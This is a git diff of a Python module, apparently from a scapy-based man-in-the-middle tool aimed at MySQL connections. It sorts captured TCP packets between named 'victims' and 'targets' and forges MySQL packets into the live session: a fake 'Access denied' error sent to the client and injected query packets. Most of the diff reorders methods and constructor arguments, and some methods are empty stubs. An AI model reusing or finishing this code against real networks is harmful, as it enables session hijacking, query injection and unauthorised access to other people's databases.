@@ -1,41 +1,16 @@
 import scapy.all as scapy
-from lib import packet as lpkt,logger as _
+from datas import logger as _
+from lib import packet as lpkt
 from lib.proto import Events, atoh, htos
 
 log = _.log
+protoname = "MySQL"
+protolayer = "tcp"
 
 class MySQL:
 	nat	 = ""
 
-	def login(self, salt, password):
-		True
-
-	def access_denied(self, user, ip, password = False):
-		return "Access denied for '{}'@'{}' (using password: {})".format(user, ip, "YES" if password else "NO")
-
-	def deny(self, response):
-		# packet length		= 0x00 0x00 0x00	(bytes on 3 octets)
-		# packet number		= 0x02				(most of case 2 packets, 0x00 greetings, 0x01 login, 0x02 login)
-		# response error	= 0xff				(response code, 0x00 for response ok)
-		# error code		= 1504				(code: 1045)
-		# SQL state			= 3238303030		(state: 28000)
-		payload = "ff1504233238303030"+atoh(response)
-		length = len(bytes.fromhex(payload)).to_bytes(3, 'little')
-		return scapy.RAW(load=length+b"\x02"+payload.encode('utf-8'))
-
-	def query(self, request):
-		# packet length		= 0x00 0x00 0x00	(bytes on 3 octets)
-		# packet number		= 0x00				(most of cases packet 0, query is the 1st)
-		# MySQL query		= 0x03				(query command code)
-		payload = "03"+atoh(request)
-		length  = len(bytes.fromhex(payload)).to_bytes(3, 'little')
-		return scapy.RAW(load=length+b"\x00"+payload.encode('utf-8'))
-
-	def nat(self, port):
-		self.layout_cli[scapy.TCP].sport = port;
-		self.layout_srv[scapy.TCP].dport = port;
-
-	def __init__(self, server, client, host):
+	def __init__(self, host, client, server):
 		#if isinstance(server, list):
 		#	server = server[0]
 		#if isinstance(client, list):
@@ -74,17 +49,70 @@ class MySQL:
 			ack = 79
 		)
 
+	def login(self, salt, password):
+		True
+
+	def access_denied(self, user, ip, password = False):
+		return "Access denied for '{}'@'{}' (using password: {})".format(user, ip, "YES" if password else "NO")
+
+	def deny(self, response):
+		# packet length		= 0x00 0x00 0x00	(bytes on 3 octets)
+		# packet number		= 0x02				(most of case 2 packets, 0x00 greetings, 0x01 login, 0x02 login)
+		# response error	= 0xff				(response code, 0x00 for response ok)
+		# error code		= 1504				(code: 1045)
+		# SQL state			= 3238303030		(state: 28000)
+		payload = "ff1504233238303030"+atoh(response)
+		length = len(bytes.fromhex(payload)).to_bytes(3, 'little')
+		return scapy.RAW(load=length+b"\x02"+payload.encode('utf-8'))
+
+	def query(self, request):
+		# packet length		= 0x00 0x00 0x00	(bytes on 3 octets)
+		# packet number		= 0x00				(most of cases packet 0, query is the 1st)
+		# MySQL query		= 0x03				(query command code)
+		payload = "03"+atoh(request)
+		length  = len(bytes.fromhex(payload)).to_bytes(3, 'little')
+		return scapy.RAW(load=length+b"\x00"+payload.encode('utf-8'))
+
+	def nat(self, port):
+		self.layout_cli[scapy.TCP].sport = port;
+		self.layout_srv[scapy.TCP].dport = port;
+
 class Protocol:
 	# Store the event object
 	events  = None
 	forge   = None
 	trick   = False
 
+	# Initialize the MYSQL protocol
+	def __init__(self, host, stdin, victims, targets, gateway):
+		global log, protoname, protolayer
+		# Initialize the event handler with the source and distination IP Addresses
+		self.events = Events(protolayer)
+		self.forge  = MySQL(host, victims[0], targets[0])
+		self.stdin	= stdin
+
+		# Detect Syn Packet
+		self.events.add('detect syn', self.detect_syn, 
+			"tcp.flags == 0x02",
+		)
+		# Detect FIN Packet
+		self.events.add('detect fin', self.detect_fin, 
+			"tcp.flags == 'FA'",
+		)
+		# Detect Ack packet
+		self.events.add('detect ack', self.detect_ack, 
+			"tcp.flags == 0x010",
+		)
+		# Detect PSH packet
+		self.events.add('detect psh', self.detect_psh, 
+			"tcp.flags == 0x018",
+		)
+
 	# Dectect SYN packets and increment
 	def detect_syn(self, name, pkt):
 		self.events.syn = self.events.syn + 1
 		self.events.fin = 0
-		# Set the port a SYN connexion
+		# Set the port at SYN connexion
 		self.forge.nat(pkt[scapy.TCP].sport)
 
 	# Detect Fin packet, increment for FIN, and reset for all other flags
@@ -111,7 +139,7 @@ class Protocol:
 		self.events.psh = self.events.psh + 1
 		log.debug("psh:\t{}".format(self.events.psh))
 		if self.events.psh == 2:
-			trick = True
+			self.trick = True
 			# send response error to client
 			self.forge.layout_srv[scapy.TCP].ack = self.forge.layout_srv[scapy.TCP].ack + len(pkt[scapy.TCP].load)
 			scapy.sendp(self.forge.layout_srv)
@@ -128,33 +156,13 @@ class Protocol:
 	def send_request(self, name, pkt):
 		True
 
-	def stop(self):
-		self.events.stop()
-
-	# Initialize the MYSQL protocol
-	def __init__(self, host, victims, targets, gw, stdin = False):
-		# Initialize the event handler with the source and distination IP Addresses
-		self.events = Events('tcp')
-		log.debug(victims, targets)
-		self.forge  = MySQL(victims[0], targets[0], host)
-		
-		# Detect Syn Packet
-		self.events.add('detect syn', self.detect_syn, [
-			"tcp.flags == 0x02",
-		])
-		log.debug("test2")
-		# Detect FIN Packet
-		self.events.add('detect fin', self.detect_fin, [
-			"tcp.flags == 'FA'",
-		])
-		# Detect Ack packet
-		self.events.add('detect ack', self.detect_ack, [
-			"tcp.flags == 0x010",
-		])
-		# Detect PSH packet
-		self.events.add('detect psh', self.detect_psh, [
-			"tcp.flags == 0x018",
-		])
+	def start(self):
+		global protoname, protolayer
+		self.events.exit.clear()
 		self.events.start()
-		# Check the thread is stated
-		log.print("condition loop thread started")
+		log.print("Protocol {}[{}] started".format(protoname, protolayer))
+
+	def stop(self):
+		global protoname
+		self.events.stop()
+		log.print("Protocol {} is stopping".format(protoname))
